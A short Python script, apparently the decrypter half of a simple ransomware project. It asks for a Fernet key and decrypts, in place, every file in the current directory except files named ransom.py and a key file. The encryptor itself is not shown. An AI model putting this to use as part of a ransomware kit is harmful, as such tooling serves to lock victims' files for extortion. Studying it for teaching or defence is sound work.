import os
from cryptography.fernet import Fernet

# Identifying encrypted files
files = []
for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Key entry from user
key_input = input("Please enter the key to decrypt: ")

# Checking key validity
try:
    key = Fernet(key_input.encode())
except Exception:
    print("Invalid key format!")
    exit()

# Decrypting files
successful = True
for file in files:
    try:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        # Try decrypting
        contents_decrypted = key.decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_decrypted)
        print(f"{file} resolved successfully.")
    except Exception:
        print(f"{file} An error occurred while solving. The key may be wrong.")
        successful = False
        break  # No need to try for other files with faulty key

# Result message
if successful:
    print("All files resolved successfully!")
else:
    print("The key is incorrect or an error occurred while decoding the files.")
